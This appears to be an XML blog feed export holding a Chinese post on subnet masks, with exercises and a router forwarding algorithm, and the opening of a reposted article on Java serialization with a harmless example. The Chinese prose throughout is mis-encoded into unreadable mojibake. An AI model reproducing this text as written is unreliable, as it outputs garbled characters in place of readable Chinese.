<p>ä¸¾ä¸ªä¾‹å­ï¼šåœ¨Aç±»IPåœ°å€ä¸­ï¼Œæ¯ä¸ªAç±»ç½‘ç»œå¯èƒ½æœ‰16777214å°ä¸»æœºï¼Œå®ƒä»¬å¤„äºåŒä¸€å¹¿æ’­åŸŸã€‚åœ¨åŒä¸€å¹¿æ’­åŸŸä¸­æœ‰è¿™ä¹ˆå¤šä¸»æœºæ˜¯ä¸å¯èƒ½çš„ï¼Œç½‘ç»œä¼šå› ä¸ºå¹¿æ’­é€šä¿¡è€Œé¥±å’Œï¼Œå› æ­¤è¦åˆ’åˆ†å­ç½‘å‡å°‘ä¸å¿…è¦çš„ç½‘ç»œæµé‡ <code>(ä¼˜åŒ–ç½‘ç»œæ€§èƒ½)</code>ã€‚</p>
<ul>
<li>ä¸¤çº§IPåœ°å€ä¸å¤Ÿçµæ´»</li>
</ul>
<p>IPåœ°å€èµ„æºè¶Šæ¥è¶Šå°‘ï¼ŒWANé“¾è·¯æ¯”LANé“¾è·¯çš„é€Ÿåº¦æ…¢å¾—å¤šï¼Œä¸”æ›´æ˜‚è´µ;å¦‚æœçº¯ç²¹ç”¨å¤§è·¨åº¦çš„å¤§å‹ç½‘ç»œï¼Œè¿›è¡Œæµé‡æ•°æ®äº¤äº’ï¼Œåˆ©ç”¨ç‡ä¸é«˜ã€‚<br>å› æ­¤ä¸ºå®ç°æ›´å°çš„å¹¿æ’­åŸŸ <code>(æé«˜ç³»ç»Ÿæ•ˆç‡)</code>ï¼Œå°±éœ€è¦è¿›ä¸€æ­¥åˆ†æˆæ›´å°çš„ç½‘ç»œã€‚åˆ’åˆ†å­ç½‘åï¼Œé€šè¿‡ä½¿ç”¨æ©ç ï¼ŒæŠŠå­ç½‘éšè—èµ·æ¥ï¼Œä½¿å¾—ä»å¤–éƒ¨çœ‹ç½‘ç»œæ²¡æœ‰å˜åŒ–ï¼Œè¿™å°±æ˜¯å­ç½‘æ©ç ã€‚</p>
<p>å½“æŸä¸ªå•ä½åˆ’åˆ†å­ç½‘åï¼Œå¯¹å¤–ä»ç„¶ <code>è¡¨ç°ä¸ºä¸€ä¸ªç½‘ç»œ</code> ï¼Œé™¤æœ¬å•ä½ä¹‹å¤–çš„ç½‘ç»œçœ‹ä¸è§æœ¬å•ä½çš„å­ç½‘åˆ’åˆ†ã€‚</p>
<h2 id="å­ç½‘åˆ†ç±»"><a href="#å­ç½‘åˆ†ç±»" class="headerlink" title="å­ç½‘åˆ†ç±»"></a>å­ç½‘åˆ†ç±»</h2><p>åˆ’åˆ†å­ç½‘æ—¶ï¼Œéšç€å­ç½‘åœ°å€å€Ÿç”¨ä¸»æœºä½æ•°çš„å¢å¤šï¼Œå­ç½‘çš„æ•°ç›®éšä¹‹å¢åŠ ï¼Œä½†æ¯ä¸ªå­ç½‘ä¸­çš„å¯ç”¨ä¸»æœºæ•°é€æ¸å‡å°‘ã€‚<br>å¦‚ <code>Cç±»åœ°å€</code>ï¼ŒåŸæœ‰8ä½ä¸»æœºä½ï¼Œ$2^8$-2å³254ä¸ªä¸»æœºåœ°å€ï¼Œé»˜è®¤å­ç½‘æ©ç 255.255.255.0ã€‚(å…¨0æˆ–å…¨1ä¸å¯ç”¨ï¼‰<br>å€Ÿç”¨1ä½ä¸»æœºä½ï¼Œäº§ç”Ÿ$2^1$=2ä¸ªå­ç½‘ï¼Œæ¯ä¸ªå­ç½‘æœ‰$2^7$ä¸ªä¸»æœºåœ°å€;<br>å€Ÿç”¨2ä½ä¸»æœºä½ï¼Œäº§ç”Ÿ$2^2$=4ä¸ªå­ç½‘ï¼Œæ¯ä¸ªå­ç½‘æœ‰$2^6$ä¸ªä¸»æœºåœ°å€;<br>â€¦<br>å…·ä½“å¦‚ä¸‹å›¾<br><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gcmq2fwftij318d0iddi8.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gcmq2fwftij318d0iddi8.jpg" class="lazyload" title="test"></a></p>
<h2 id="æ˜ç¡®å­ç½‘åˆ’åˆ†çš„éœ€æ±‚"><a href="#æ˜ç¡®å­ç½‘åˆ’åˆ†çš„éœ€æ±‚" class="headerlink" title="æ˜ç¡®å­ç½‘åˆ’åˆ†çš„éœ€æ±‚"></a>æ˜ç¡®å­ç½‘åˆ’åˆ†çš„éœ€æ±‚</h2><ul>
<li><p>ç¡®å®šéœ€è¦çš„ç½‘ç»œIDæ•°:</p>
<ul>
<li>æ¯ä¸ªLANå­ç½‘ä¸€ä¸ª;</li>
<li>æ¯æ¡å¹¿åŸŸç½‘è¿æ¥ä¸€ä¸ªã€‚</li>
</ul>
</li>
<li><p>ç¡®å®šæ¯ä¸ªå­ç½‘æ‰€éœ€çš„ä¸»æœºæ•°:</p>
<ul>
<li>æ¯ä¸ªTCP/IPä¸»æœºä¸€ä¸ª;</li>
<li>æ¯ä¸ªè·¯ç”±å™¨æ¥å£ä¸€ä¸ªã€‚</li>
</ul>
</li>
<li><p>éœ€è¦ä¸€ä¸ªç”¨äºæ•´ä¸ªç½‘ç»œçš„å­ç½‘æ©ç ;</p>
<ul>
<li>æ¯ä¸ªç‰©ç†ç½‘æ®µçš„å”¯ä¸€å­ç½‘ID;</li>
<li>æ¯ä¸ªå­ç½‘çš„ä¸»æœºèŒƒå›´ã€‚</li>
</ul>
</li>
</ul>
<hr>
<h1 id="å­ç½‘æ©ç "><a href="#å­ç½‘æ©ç " class="headerlink" title="å­ç½‘æ©ç "></a>å­ç½‘æ©ç </h1><h2 id="æ¦‚è¿°åŠä½œç”¨"><a href="#æ¦‚è¿°åŠä½œç”¨" class="headerlink" title="æ¦‚è¿°åŠä½œç”¨"></a>æ¦‚è¿°åŠä½œç”¨</h2><ol>
<li>å­ç½‘æ©ç æ˜¯ä¸€ä¸ªåº”ç”¨äºTCP/IPç½‘ç»œçš„32ä½äºŒè¿›åˆ¶å€¼ï¼Œæ¯èŠ‚8ä½ï¼Œå¿…é¡»ç»“åˆIPåœ°å€å¯¹åº”ä½¿ç”¨ã€‚</li>
<li>å­ç½‘æ©ç 32ä½éƒ½ä¸IPåœ°å€32ä½å¯¹åº”ï¼Œå¦‚æœæŸä½æ˜¯<font color="6495ED">ç½‘ç»œåœ°å€ï¼Œåˆ™å­ç½‘æ©ç ä¸º1ï¼Œå¦åˆ™ä¸º0ã€‚</font></li>
<li>å­ç½‘æ©ç å¯ä»¥é€šè¿‡ä¸ <code>IPåœ°å€&quot;ä¸&quot;è®¡ç®—</code>ï¼Œåˆ†ç¦»å‡ºIPåœ°å€ä¸­çš„ç½‘ç»œåœ°å€å’Œä¸»æœºåœ°å€ï¼Œç”¨äºåˆ¤æ–­è¯¥IPåœ°å€æ˜¯åœ¨å±€åŸŸç½‘ä¸Šï¼Œè¿˜æ˜¯åœ¨å¹¿åŸŸç½‘ä¸Šã€‚</li>
<li>å­ç½‘æ©ç ä¸€èˆ¬ç”¨äºå°†ç½‘ç»œè¿›ä¸€æ­¥åˆ’åˆ†ä¸ºè‹¥å¹²å­ç½‘ï¼Œä»¥é¿å…ä¸»æœºè¿‡å¤šè€Œæ‹¥å µæˆ–è¿‡å°‘è€ŒIPæµªè´¹ã€‚(ä¸Šé¢ä¹Ÿæåˆ°äº†)</li>
</ol>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gcmq2fv8ckj30pf0fy75p.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gcmq2fv8ckj30pf0fy75p.jpg" class="lazyload" title="test"></a></p>
<h2 id="ä¸ºä»€ä¹ˆè¦ä½¿ç”¨å­ç½‘æ©ç "><a href="#ä¸ºä»€ä¹ˆè¦ä½¿ç”¨å­ç½‘æ©ç " class="headerlink" title="ä¸ºä»€ä¹ˆè¦ä½¿ç”¨å­ç½‘æ©ç "></a>ä¸ºä»€ä¹ˆè¦ä½¿ç”¨å­ç½‘æ©ç </h2><p>å­ç½‘æ©ç å¯ä»¥åˆ†ç¦»å‡ºIPåœ°å€ä¸­çš„ç½‘ç»œåœ°å€å’Œä¸»æœºåœ°å€ï¼Œé‚£ä¸ºä»€ä¹ˆè¦åˆ†ç¦»å‘¢ï¼Ÿå› ä¸ºä¸¤å°è®¡ç®—æœºè¦é€šè®¯ï¼Œé¦–å…ˆè¦åˆ¤æ–­æ˜¯å¦å¤„äºåŒä¸€ä¸ªå¹¿æ’­åŸŸå†…ï¼Œå³ç½‘ç»œåœ°å€æ˜¯å¦ç›¸åŒã€‚å¦‚æœç½‘ç»œåœ°å€ç›¸åŒï¼Œè¡¨æ˜æ¥å—æ–¹åœ¨æœ¬ç½‘ç»œä¸Šï¼Œé‚£ä¹ˆå¯ä»¥æŠŠæ•°æ®åŒ…ç›´æ¥å‘é€åˆ°ç›®æ ‡ä¸»æœºï¼Œ<font color="6495ED">å¦åˆ™å°±éœ€è¦è·¯ç”±ç½‘å…³å°†æ•°æ®åŒ…è½¬å‘é€åˆ°ç›®çš„åœ°ã€‚</font></p>
<hr>
<h2 id="å­ç½‘æ©ç çš„åˆ†ç±»"><a href="#å­ç½‘æ©ç çš„åˆ†ç±»" class="headerlink" title="å­ç½‘æ©ç çš„åˆ†ç±»"></a>å­ç½‘æ©ç çš„åˆ†ç±»</h2><h3 id="ç¼ºçœå­ç½‘æ©ç ï¼š"><a href="#ç¼ºçœå­ç½‘æ©ç ï¼š" class="headerlink" title="ç¼ºçœå­ç½‘æ©ç ï¼š"></a>ç¼ºçœå­ç½‘æ©ç ï¼š</h3><p>(æœªåˆ’åˆ†å­ç½‘)<br>å­ç½‘æ©ç 32ä½ä¸IPåœ°å€32ä½å¯¹åº”,å¦‚æœæŸä½æ˜¯ç½‘ç»œåœ°å€ï¼Œåˆ™å­ç½‘æ©ç ä¸º1ï¼Œå¦åˆ™ä¸º0ã€‚<br>ä¾‹å¦‚Aç±»IPåœ°å€ï¼Œç¬¬ä¸€èŠ‚ä¸ºç½‘ç»œåœ°å€ï¼Œå…¶ä½™ä¸‰èŠ‚ä¸ºä¸»æœºåœ°å€<br>æ•…æ©ç ä¸º<code>11111111.00000000.00000000.00000000</code></p>
<p><font color="6495ED">Aç±»ç½‘ç»œ</font> ç¼ºçœå­ç½‘æ©ç ï¼š<code>255.0.0.0</code><br><font color="6495ED">Bç±»ç½‘ç»œ</font> ç¼ºçœå­ç½‘æ©ç ï¼š<code>255.255.0.0</code><br><font color="6495ED">Cç±»ç½‘ç»œ</font> ç¼ºçœå­ç½‘æ©ç ï¼š<code>255.255.255.0</code></p>
<h3 id="è‡ªå®šä¹‰å­ç½‘æ©ç ï¼š"><a href="#è‡ªå®šä¹‰å­ç½‘æ©ç ï¼š" class="headerlink" title="è‡ªå®šä¹‰å­ç½‘æ©ç ï¼š"></a>è‡ªå®šä¹‰å­ç½‘æ©ç ï¼š</h3><p>å°†ä¸€ä¸ªç½‘ç»œåˆ’åˆ†ä¸ºè‹¥å¹²å­ç½‘ï¼Œå¸Œæœ›æ¯ä¸ªå­ç½‘æ‹¥æœ‰ä¸åŒçš„ç½‘ç»œåœ°å€æˆ–å­ç½‘åœ°å€ã€‚å› ä¸ºï¼©ï¼°æ˜¯æœ‰é™çš„ï¼Œå®é™…ä¸Šæˆ‘ä»¬æ˜¯å°†ä¸»æœºåœ°å€åˆ†ä¸ºä¸¤ä¸ªéƒ¨åˆ†ï¼šå­ç½‘ç½‘ç»œåœ°å€ã€å­ç½‘ä¸»æœºåœ°å€ã€‚å½¢å¼å¦‚ä¸‹ï¼š<br>æœªåšå­ç½‘åˆ’åˆ†çš„ipåœ°å€ï¼š<strong>ç½‘ç»œåœ°å€ï¼‹ä¸»æœºåœ°å€</strong><br>åšå­ç½‘åˆ’åˆ†åçš„ipåœ°å€ï¼š<strong>ç½‘ç»œåœ°å€ï¼‹ï¼ˆå­ç½‘ç½‘ç»œåœ°å€ï¼‹å­ç½‘ä¸»æœºåœ°å€ï¼‰</strong></p>
<h3 id="å­ç½‘æ©ç å’Œipåœ°å€çš„å…³ç³»"><a href="#å­ç½‘æ©ç å’Œipåœ°å€çš„å…³ç³»" class="headerlink" title="å­ç½‘æ©ç å’Œipåœ°å€çš„å…³ç³»"></a>å­ç½‘æ©ç å’Œipåœ°å€çš„å…³ç³»</h3><p>è®¾IPåœ°å€ä¸º192.168.10.2ï¼Œå­ç½‘æ©ç ä¸º255.255.255.240ï¼Œé‚£ä¹ˆå­ç½‘æ©ç æ˜¯æ€æ ·æ¥åŒºåˆ†ç½‘ç»œåœ°å€å’Œä¸»æœºåœ°å€çš„å‘¢ã€‚</p>
<p>ä¸»æœºåœ°å€ä¸ºï¼š0.0.0.2ï¼ˆå°†æ©ç å–åï¼Œç„¶åä¸IPåœ°å€è¿›è¡Œä¸è¿ç®—ï¼‰</p>
<p><font color="6495ED">ä¸è¿ç®—</font>:å¯¹åº”ä½å…¨æ˜¯ <code>1</code> ç»“æœä¸º <code>1</code> ,å¦åˆ™ä¸º <code>0</code><br><font color="6495ED">æˆ–è¿ç®—</font>:å¯¹åº”ä½å…¨æ˜¯ <code>0</code> ç»“æœä¸º <code>0</code>, å¦åˆ™ä¸º <code>1</code></p>
<hr>
<h1 id="å­ç½‘æ©ç ä¹ é¢˜"><a href="#å­ç½‘æ©ç ä¹ é¢˜" class="headerlink" title="å­ç½‘æ©ç ä¹ é¢˜"></a>å­ç½‘æ©ç ä¹ é¢˜</h1><h2 id="ä¾‹-1"><a href="#ä¾‹-1" class="headerlink" title="ä¾‹ 1"></a>ä¾‹ 1</h2><p><strong>å·²çŸ¥IPåœ°å€æ˜¯ <code>141.14.72.24</code>ï¼Œ å­ç½‘æ©ç æ˜¯ <code>255.255.192.0</code> æ±‚ç½‘ç»œåœ°å€</strong></p>
<h3 id="è§£ç­”"><a href="#è§£ç­”" class="headerlink" title="è§£ç­”"></a>è§£ç­”</h3><p>é¦–å…ˆé€šè¿‡å­ç½‘æ©ç å’ŒIPåœ°å€è¿›è¡Œä¸è¿ç®—ï¼Œå¯ä»¥æ¨æ–­ç½‘ç»œåœ°å€ä¸º <code>141.14.xx.0</code></p>
<p>ç„¶ååªéœ€è¦çŸ¥é“ <code>72</code> å’Œ <code>192</code> çš„äºŒè¿›åˆ¶<br>é¦–å…ˆ <code>72</code> = <code>0100 1000</code><br>ç„¶å <code>192</code>= <code>1100 0000</code><br>è¿›è¡Œä¸è¿ç®—å¯ä»¥å¾—åˆ° <code>0100 0000</code> = <code>64</code></p>
<p>åŒæ—¶å¯ä»¥çŸ¥é“ <code>1100 0000</code> å­ç½‘å·å äº† <code>2</code> ä¸ªä½ï¼Œå‰©ä¸‹14ï¼ˆ6+8ï¼‰ä½ä¸ºä¸»æœºå·ï¼Œå³æœ‰ $2^{14}$ ä¸ªä¸»æœº</p>
<p>ä¸»æœºå·å…¨ <code>0</code> è¡¨ç¤ºè¿™ä¸ªç½‘ç»œæ®µæœ¬èº«ç§°ä¹‹ä¸º: <code>ç½‘ç»œå·</code><br>ä¸»æœºå·å…¨ <code>1</code> çš„åœ°å€ç§°ä¹‹ä¸º: <code>å¹¿æ’­åœ°å€</code></p>
<p>ç„¶åå†™ä¸ªè¡¨ï¼Œç”¨æ¥è®°ä¸€ä¸‹å¸¸è§„æ•°æ®çš„äºŒè¿›åˆ¶<br>|äºŒè¿›åˆ¶|åè¿›åˆ¶|<br>|:â€”-:|â€”:|<br>|1000 0000|128|<br>|1100 0000|192|<br>|1110 0000|224|<br>|1111 0000|240|<br>|1111 1000|248|<br>|1111 1100|252|<br>|1111 1110|254|<br>|1111 1111|255|</p>
<hr>
<h2 id="ä¾‹é¢˜2"><a href="#ä¾‹é¢˜2" class="headerlink" title="ä¾‹é¢˜2"></a>ä¾‹é¢˜2</h2><p><strong>æŸä¸»æœºçš„ <code>IPåœ°å€</code>ä¸º <code>180.80.77.55</code>ï¼Œå­ç½‘æ©ç ä¸º <code>255.255.252.0</code>ã€‚è‹¥è¯¥ä¸»æœºå‘å…¶æ‰€åœ¨çš„å­ç½‘å‘é€å¹¿æ’­åˆ†ç»„ï¼Œåˆ™ç›®çš„åœ°å€å¯ä»¥ä¸º</strong></p>
<p>A. 180.80.76.0<br>B. 180.80.76.255<br>C. 180.80.77.255<br>D. 180.80.79.255</p>
<h3 id="è§£ç­”-1"><a href="#è§£ç­”-1" class="headerlink" title="è§£ç­”"></a>è§£ç­”</h3><p>é¦–å…ˆå€¼å¾—æ³¨æ„æ˜¯å‘å­ç½‘å‘é€ <font color="6495ED">å¹¿æ’­åˆ†ç»„</font><br><font color="6495ED">å¹¿æ’­åˆ†ç»„</font> å³ä¸º <font color="6495ED">å¹¿æ’­åœ°å€</font> ä¹Ÿå°±æ˜¯ä¸»æœºå·å…¨ <code>1</code></p>
<p>å› æ­¤å¯ä»¥é¦–å…ˆæ’é™¤Aé€‰é¡¹ï¼Œç„¶åå¯ä»¥å…³æ³¨åˆ°å­ç½‘æ©ç çš„ç¬¬ä¸‰ä¸ªä½ç½®æ˜¯ <code>252</code><br>ç”±ä¸Šé¢çš„è¡¨å¯ä»¥çŸ¥é“äºŒè¿›åˆ¶ç¼–ç ä¸º <code>1111 1100</code><br>ä¹Ÿå°±æ˜¯è¯´å‰é¢å…±æœ‰ <code>8+8+6=22</code> ä½ä¸º <font color="6495ED">ç½‘ç»œå·+å­ç½‘å·</font> åé¢çš„ <code>10ä½</code> ä¸ºä¸»æœºå·<br>ç„¶åçœ‹ <code>IPåœ°å€</code> <code>180.80.77.55</code><br>77 = <font color="6495ED">0100 11</font>01<br>å¯ä»¥åˆ¤æ–­ä¸»æœºæ‰€åœ¨çš„å­ç½‘å·ä¸º <code>180.80.76.xxx</code><br>ç„¶åå› ä¸ºè¦æ‰¾çš„æ˜¯<font color="6495ED">ç›®çš„åœ°å€</font>ï¼Œæ‰€ä»¥æ‰€æœ‰çš„ä¸»æœºå·éƒ½è¦ä¸º 1ï¼Œæ‰€ä»¥ç¬¬ä¸‰ä½ipåº”è¯¥å˜æˆ <font color="6495ED">0100 1111</font> å³ä¸º 76+3=79ï¼Œæ‰€ä»¥ç­”æ¡ˆé€‰ D</p>
<hr>
<h1 id="è·¯ç”±å™¨è½¬å‘åˆ†ç»„çš„ç®—æ³•"><a href="#è·¯ç”±å™¨è½¬å‘åˆ†ç»„çš„ç®—æ³•" class="headerlink" title="è·¯ç”±å™¨è½¬å‘åˆ†ç»„çš„ç®—æ³•"></a>è·¯ç”±å™¨è½¬å‘åˆ†ç»„çš„ç®—æ³•</h1><h2 id="æå–ç›®çš„IPåœ°å€"><a href="#æå–ç›®çš„IPåœ°å€" class="headerlink" title="æå–ç›®çš„IPåœ°å€"></a>æå–ç›®çš„IPåœ°å€</h2><p>ä»åˆ†ç»„çš„é¦–éƒ¨æå–ç›®çš„IPåœ°å€ <code>D</code></p>
<h2 id="æ˜¯å¦ç›´æ¥äº¤ä»˜"><a href="#æ˜¯å¦ç›´æ¥äº¤ä»˜" class="headerlink" title="æ˜¯å¦ç›´æ¥äº¤ä»˜"></a>æ˜¯å¦ç›´æ¥äº¤ä»˜</h2><p>å…ˆç”¨<font color="6495ED">ä¸è¯¥è·¯ç”±å™¨ç›´æ¥ç›¸è¿çš„ç½‘ç»œ</font>çš„å­ç½‘æ©ç ä¸IPåœ°å€ <code>D</code> è¿›è¡Œä¸è¿ç®—ï¼Œçœ‹ç»“æœæ˜¯å¦ä¸ç›¸åº”çš„ç½‘ç»œï¼Œåœ°å€ç›¸åŒ¹é…ã€‚è‹¥åŒ¹é…ï¼Œåˆ™è¿›è¡Œç›´æ¥äº¤ä»˜ã€‚å¦åˆ™å°±æ˜¯é—´æ¥äº¤ä»˜ï¼Œé©¬ä¸Šæ‰§è¡Œä¸‹ä¸€æ­¥</p>
<h2 id="ç‰¹å®šä¸»æœºè·¯ç”±"><a href="#ç‰¹å®šä¸»æœºè·¯ç”±" class="headerlink" title="ç‰¹å®šä¸»æœºè·¯ç”±"></a>ç‰¹å®šä¸»æœºè·¯ç”±</h2><p>è‹¥è·¯ç”±è¡¨ä¸­æœ‰ä¸€æ¡åˆ°ç›®çš„ä¸»æœº <code>D</code> çš„ç‰¹å®šè·¯ç”±ï¼Œåˆ™å°†åˆ†ç»„è½¬å‘ç»™å…¶æŒ‡æ˜çš„ä¸‹ä¸€è·³è·¯ç”±å™¨ã€‚å¦åˆ™æ‰§è¡Œä¸‹ä¸€æ­¥</p>
<h2 id="æ£€æµ‹è·¯ç”±è¡¨ä¸­æœ‰æ— è·¯å¾„"><a href="#æ£€æµ‹è·¯ç”±è¡¨ä¸­æœ‰æ— è·¯å¾„" class="headerlink" title="æ£€æµ‹è·¯ç”±è¡¨ä¸­æœ‰æ— è·¯å¾„"></a>æ£€æµ‹è·¯ç”±è¡¨ä¸­æœ‰æ— è·¯å¾„</h2><p>å¯¹è·¯ç”±è¡¨ä¸­æ¯ä¸€è¡Œçš„å­ç½‘æ©ç å’ŒDè¿›è¡Œä¸è¿ç®—ï¼Œè‹¥ç»“æœä¸è¯¥è¡Œçš„ç›®çš„ç½‘ç»œåœ°å€åŒ¹é…ï¼Œåˆ™å°†åˆ†ç»„ä¼ ç»™è¯¥è¡ŒæŒ‡æ˜çš„ä¸‹ä¸€è·³è·¯ç”±å™¨ã€‚å¦åˆ™æ‰§è¡Œä¸‹ä¸€æ­¥</p>
<h2 id="é»˜è®¤è·¯ç”±-0-0-0-0"><a href="#é»˜è®¤è·¯ç”±-0-0-0-0" class="headerlink" title="é»˜è®¤è·¯ç”± 0.0.0.0"></a>é»˜è®¤è·¯ç”± 0.0.0.0</h2><p>è‹¥è·¯ç”±è¡¨ä¸­æœ‰ä¸€ä¸ªé»˜è®¤è·¯ç”±ï¼Œåˆ™å°†åˆ†ç»„ä¼ ç»™è·¯ç”±è¡¨ä¸­æŒ‡æ˜çš„é»˜è®¤è·¯ç”±å™¨ã€‚<br>å¦åˆ™æ‰§è¡Œæœ€åä¸€æ­¥</p>
<h2 id="ä¸¢å¼ƒ"><a href="#ä¸¢å¼ƒ" class="headerlink" title="ä¸¢å¼ƒ"></a>ä¸¢å¼ƒ</h2><p>æŠ¥å‘Šè½¬å‘åˆ†ç»„å‡ºé”™</p>
]]></content>
      <categories>
        <category>çæ‰¯</category>
      </categories>
      <tags>
        <tag>çæ‰¯</tag>
      </tags>
  </entry>
  <entry>
    <title>æµ…æJavaåºåˆ—åŒ–å’Œååºåˆ—åŒ– [è½¬è½½]</title>
    <url>/yakko117/2020/02/28/about-java-serialization-and-deserialization/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\yakko117\assets\css\APlayer.min.css"><script src="\yakko117\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\yakko117\assets\js\Meting.min.js"></script><p>github ä¸Šçœ‹åˆ°çš„ï¼Œè¾¹çœ‹è¾¹å­¦ï¼Œè¾¹è®°ç¬”è®°<br><a href="https://github.com/gyyyy" target="_blank" rel="noopener">æ„Ÿè°¢å®«éŸ³å¸ˆå‚…çš„æ–‡ç« </a></p>
<a id="more"></a>

<h1 id="æµ…æJavaåºåˆ—åŒ–å’Œååºåˆ—åŒ–"><a href="#æµ…æJavaåºåˆ—åŒ–å’Œååºåˆ—åŒ–" class="headerlink" title="æµ…æJavaåºåˆ—åŒ–å’Œååºåˆ—åŒ–"></a>æµ…æJavaåºåˆ—åŒ–å’Œååºåˆ—åŒ–</h1><p>åˆ«è¯´ä½ æ‡‚ååºåˆ—åŒ–ï¼Œä¹Ÿåˆ«å†è¯´ä½ ä¸æ‡‚ååºåˆ—åŒ–ã€‚</p>
<h1 id="åºåˆ—åŒ–æœºåˆ¶"><a href="#åºåˆ—åŒ–æœºåˆ¶" class="headerlink" title="åºåˆ—åŒ–æœºåˆ¶"></a>åºåˆ—åŒ–æœºåˆ¶</h1><p>åºåˆ—åŒ– <code>Serialization</code> æ˜¯æŒ‡å°†æ•°æ®ç»“æ„æˆ–å¯¹è±¡çŠ¶æ€è½¬æ¢æˆå­—èŠ‚æµï¼Œä¾‹å¦‚ <code>å­˜å‚¨æˆæ–‡ä»¶ã€å†…å­˜ç¼“å†²ï¼Œæˆ–ç»ç”±ç½‘ç»œä¼ è¾“</code> ï¼Œä»¥ç•™å¾…åç»­åœ¨ç›¸åŒæˆ–å¦ä¸€å°è®¡ç®—æœºç¯å¢ƒä¸­ï¼Œèƒ½å¤Ÿæ¢å¤å¯¹è±¡åŸæ¥çŠ¶æ€çš„è¿‡ç¨‹ã€‚åºåˆ—åŒ–æœºåˆ¶åœ¨Javaä¸­æœ‰ç€å¹¿æ³›çš„åº”ç”¨ï¼Œ<code>EJBã€RMIã€Hessian</code> ç­‰æŠ€æœ¯éƒ½ä»¥æ­¤ä¸ºåŸºç¡€ã€‚</p>
<hr>
<h2 id="åºåˆ—åŒ–"><a href="#åºåˆ—åŒ–" class="headerlink" title="åºåˆ—åŒ–"></a>åºåˆ—åŒ–</h2><p>æˆ‘ä»¬å…ˆç”¨ä¸€ä¸ªç®€å•çš„åºåˆ—åŒ–ç¤ºä¾‹æ¥çœ‹çœ‹Javaç©¶ç«Ÿæ˜¯å¦‚ä½•å¯¹ä¸€ä¸ªå¯¹è±¡è¿›è¡Œåºåˆ—åŒ–çš„ï¼š</p>
<h2 id="ç®€å•åºåˆ—åŒ–ç¤ºä¾‹"><a href="#ç®€å•åºåˆ—åŒ–ç¤ºä¾‹" class="headerlink" title="ç®€å•åºåˆ—åŒ–ç¤ºä¾‹"></a>ç®€å•åºåˆ—åŒ–ç¤ºä¾‹</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">java</div></div><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SerializationDemo</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String stringField;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> intField;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">SerializationDemo</span><span class="params">(String s, <span class="keyword">int</span> i)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.stringField = s;</span><br><span class="line">        <span class="keyword">this</span>.intField = i;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        ByteArrayOutputStream bout = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream out = <span class="keyword">new</span> ObjectOutputStream(bout);</span><br><span class="line">        out.writeObject(<span class="keyword">new</span> SerializationDemo(<span class="string">"gyyyy"</span>, <span class="number">97777</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>å¦‚æœç†Ÿæ‚‰PHPçš„åŒå­¦åº”è¯¥çŸ¥é“ï¼Œè¿™ä¸ªå¯¹è±¡åœ¨ç»è¿‡PHPåºåˆ—åŒ–åå¾—åˆ°çš„å­—ç¬¦ä¸²å¦‚ä¸‹ <font color="#0099ff">å› ä¸ºPHPä¸Javaçš„ç¼–ç¨‹ä¹ æƒ¯æœ‰æ‰€åŒºåˆ«</font>ï¼Œè¿™é‡Œå­—æ®µè®¿é—®æƒé™å…¨æ”¹ä¸ºäº†<code>public</code>ï¼Œ<code>private</code>å’Œ<code>protected</code>ä»è¡¨ç°å½¢å¼ä¸Šæ¥è¯´å·®ä¸å¤šï¼Œåªæ˜¯å¤šäº†äº›ç‰¹æ®Šçš„æ ‡è¯†è€Œå·²ï¼Œä¸ºäº†å‡å°‘ä¸€äº›é›¶åŸºç¡€çš„åŒå­¦ä¸å¿…è¦çš„ç–‘æƒ‘ï¼Œè¿™é‡Œæš‚ä¸è®¨è®ºï¼š</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">O:17:&quot;SerializationDemo&quot;:2:&#123;s:11:&quot;stringField&quot;;s:5:&quot;gyyyy&quot;;s:8:&quot;intField&quot;;i:97777;&#125;</span><br></pre></td></tr></table></figure></div>

